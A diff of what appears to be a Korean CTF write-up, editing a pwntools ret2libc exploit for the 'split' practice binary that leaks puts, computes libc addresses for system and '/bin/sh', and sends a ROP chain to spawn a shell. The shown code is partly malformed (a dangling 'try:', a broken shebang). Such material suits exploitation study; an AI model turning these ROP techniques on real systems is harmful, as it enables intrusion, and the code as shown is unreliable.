@@ -86,11 +86,10 @@ r.interactive()
 libc 파일 가져와서 쓰는 방법으로는
 
 
-```
+```python
 #!/bin"python3
 from pwn import *
 
-# 1. 기본 설정
 e = ELF('./split')
 p = process(e.path)
 libc = ELF('./libc6.so') 
@@ -98,7 +97,6 @@ libc = ELF('./libc6.so')
 pop_rdi_ret = 0x004007c3
 main_addr = e.symbols['main'] 
 ret_gadget = 0x0040053e 
-
 
 payload = b'A' * 40           
 payload += p64(pop_rdi_ret)    
@@ -109,11 +107,8 @@ payload += p64(main_addr)
 p.recvuntil(b'> ')
 p.sendline(payload)
 
-
 try:
     p.recvuntil(b'Thank you!\n')
-
-
 
 leaked_data = p.recv(6) 
 leaked_puts = u64(leaked_data.ljust(8, b'\x00'))
@@ -126,7 +121,6 @@ bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
 log.info(f"Libc base address: {hex(libc_base)}")
 log.info(f"Calculated 'system' address: {hex(system_addr)}")
 log.info(f"Calculated '/bin/sh' address: {hex(bin_sh_addr)}")
-
 
 payload2 = b'A' * 40
 payload2 += p64(pop_rdi_ret)
